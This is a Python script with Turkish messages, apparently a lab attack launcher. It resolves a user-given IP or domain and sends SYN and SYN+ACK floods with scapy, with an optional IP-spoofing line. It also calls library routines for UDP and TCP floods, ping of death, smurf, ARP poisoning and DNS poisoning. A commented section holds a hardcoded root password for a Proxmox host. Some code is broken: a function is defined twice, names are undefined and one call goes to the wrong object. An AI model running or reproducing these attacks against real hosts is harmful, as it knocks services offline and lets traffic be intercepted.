from scapy.all import *
from attack.mitm import ARPAttack
from attack.mitm import dns_poisoning
from attack import dos
import socket
import ipaddress
from proxmoxer import ProxmoxAPI
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

target_ip = ""
target_port = 0
input_ip=""

# proxmox = ProxmoxAPI('192.168.1.104', user='root@pam', password='nıla123', verify_ssl=False)

# def run_command_on_ct(node_name, ct_id, command):
#     try:
#         proxmox.nodes(node_name).lxc(ct_id).commands.post(command=command)
#         print(f"Komut CT {ct_id} üzerinde başarıyla çalıştırıldı.")
#     except Exception as e:
#         print(f"Hata: Komut CT {ct_id} üzerinde çalıştırılamadı.")
#         print(str(e))

# # node_name = "proxmoxmonster"
# # ct_id = 100
# # syn_attack_command = "python syn_flood.py"

# # run_command_on_ct(node_name, ct_id, syn_attack_command)







def triggerAttack(attackName, input_ipOrDns, input_port):
    global input_ip
    input_ip=""
    if input_ipOrDns.startswith("http") or input_ipOrDns.endswith("/"):
        # eğer http ile başlıyorsa http veya https'yi temizle
        input_ipOrDns = input_ipOrDns.replace(
            "http://", "").replace("https://", "").replace("/", "")
        if input_ipOrDns.startswith("www"):
            input_ip = dns_to_ip(input_ipOrDns)
        else:
            print("DNS çözümleme başarısız! Girmiş olduğunuz DNS adresinin doğruluğunu kontrol edin.")
    elif input_ipOrDns.startswith("www"):
        input_ip = dns_to_ip(input_ipOrDns)
    else:  
        if is_valid_ip_address(input_ipOrDns):
            input_ip=input_ipOrDns
        else:
            print("Geçersiz IP veya DNS adresi!")

    if attackName == "TCP SYN+ACK":
        tcpSynAck(input_ip, input_port)
    elif attackName == "SYN Flood":
        if input_ip =="":
            print("SYN Flood saldırısı yapılamadı!")
        else:
            synFlood(input_ip, input_port)
        
    else:
        print(attackName)


def dns_to_ip(domain_name):
    try:
        ip_address = socket.gethostbyname(domain_name)
        print(f"{domain_name} DNS'i, IP adresi: {ip_address}")
        return ip_address
    except socket.error as e:
        print(f"DNS çözme hatası: {e}")

def is_valid_ip_address(ip_address):
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False



def tcpSynAck(ip, port):
    global target_ip
    global target_port
    print("TcpSynAck yapılıyor.")

    try:
        # target IP address (should be a testing router/firewall)
        target_ip = ip
        # the target port u want to flood
        target_port = port
        # forge IP packet with target ip as the destination IP address
        ip = IP(dst=target_ip)
        # or if you want to perform IP Spoofing (will work as well)
        # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
        # forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="SA")
        # add some flooding data (1KB in this case)
        raw = Raw(b"X"*1024)
        # stack up the layers
        p = ip / tcp / raw
        # send the constructed packet in a loop until CTRL+C is detected
        print("yollanıyor")
        send(p,verbose=0)
    except Exception as e:
        print("tcpSynAck saldırısı yapılamadı!")
        print(str(e))



def synFlood(ip, port):
    global target_ip
    global target_port
    try:
        # target IP address (should be a testing router/firewall)
        target_ip = ip
        # the target port u want to flood
        target_port = port
        # forge IP packet with target ip as the destination IP address
        ip = IP(dst=target_ip)
        # or if you want to perform IP Spoofing (will work as well)
        # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
        # forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        # add some flooding data (1KB in this case)
        raw = Raw(b"X"*1024)
        # stack up the layers
        p = ip / tcp / raw
        # send the constructed packet in a loop until CTRL+C is detected
        print("yollanıyor")
        send(p,verbose=0)
    except Exception as e:
        print("SynFlood saldırısı yapılamadı!")
        print(str(e))

def synFlood(ip, port):
    global target_ip
    global target_port
    try:
        # target IP address (should be a testing router/firewall)
        target_ip = ip
        # the target port u want to flood
        target_port = port
        # forge IP packet with target ip as the destination IP address
        ip = IP(dst=target_ip)
        # or if you want to perform IP Spoofing (will work as well)
        # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
        # forge a TCP SYN packet with a random source port
        # and the target port as the destination port
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        # add some flooding data (1KB in this case)
        raw = Raw(b"X"*1024)
        # stack up the layers
        p = ip / tcp / raw
        # send the constructed packet in a loop until CTRL+C is detected
        print("yollanıyor")
        send(p,verbose=0)
    except Exception as e:
        print("SynFlood saldırısı yapılamadı!")
        print(str(e))

def UDPFlood(ip, port):
    global target_ip
    global target_port
    try:
        # target IP address (should be a testing router/firewall)
        target_ip = ip
        # the target port u want to flood
        target_port = port
        # timeout in seconds
        timeout = 60

        # TCP flood attack
        dos.tcp_flood_attack(target_ip, port, timeout)

        # TCP SYN attack
        dos.syn_flood_attack(target_ip, port, timeout)

        # UDP flood attack
        dos.udp_flood_attack(target_ip, port, timeout)
    except Exception as e:
        print("UDPFlood saldırısı yapılamadı!")
        print(str(e))

def ICMPFlood(ip):
    global target_ip
    try:
        target_ip = ip
        # timeout in seconds
        timeout = 60
        # use threading for faster performance
        use_thread = True

        # ping of death attack
        dos.ping_of_death(target_ip, use_thread, timeout)

        # DDoS smurf attack
        dos.smurf_attack(target_ip, timeout)
    except Exception as e:
        print("ICMP Flood saldırısı yapılamadı!")
        print(str(e))


gateway= ('c91f05bc4c59', '93.120.174.77')
victim= ('7aab539606eb', '58.88.156.2')
attacker= ('50676bbcc76a', '132.39.100.142')

def arpPoisoning(gateway, victim, attacker):
    arp_attack = ARPAttack(gateway, victim, attacker)
    # run attack
    arp_attack.start_poisoning()
    # stop attack
    attack.stop_poisoning()

def dnsPoisoning():
    # receives target DNS server, original domain name, forged address and DNS query id numbers list
    # the id numbers are required to forward a forged DNS answer to the target server
    dns_poisoning(TARGET_SERVER, DOMAIN_NAME, FORGED_IP_ADDRESS, ID_LIST)
#######################################################
# import requests

# def run_python_script_on_ct(node, ct_id, script):
#     # Proxmox API endpoint
#     url = f"https://192.168.1.104/api2/json/nodes/{node}/lxc/{ct_id}/exec"

#     # Headers
#     headers = {
#         "Content-Type": "application/json",
#     }

#     # Python script to execute
#     payload = {
#         "command": ["python", "-c", script],
#     }

#     # Send POST request to execute the Python script on the CT
#     response = requests.post(url, headers=headers, json=payload)

#     # Check response status
#     if response.status_code == 200:
#         print(f"Python script executed successfully on CT {ct_id}.")
#     else:
#         print(f"Error: Failed to execute Python script on CT {ct_id}.")
#         print(response.text)

# # Example usage
# node_name = "proxmoxmonster"
# ct_id = 102


